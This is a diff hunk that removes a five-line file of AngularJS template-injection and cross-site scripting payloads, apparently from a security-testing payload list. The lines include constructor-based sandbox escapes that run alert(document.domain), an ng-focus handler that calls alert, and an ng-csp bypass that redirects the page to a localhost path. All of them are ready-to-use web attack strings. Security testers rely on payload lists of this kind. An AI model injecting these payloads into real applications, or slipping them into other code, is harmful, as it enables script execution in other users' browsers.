@@ -1,5 +1,0 @@
-{{constructor.constructor('alert(document.domain)')()}}
-{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(document.domain)')()}}
-{{$on.constructor('alert(1)')()}}
-<input ng-focus=$event.view.alert('XSS')>
-<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
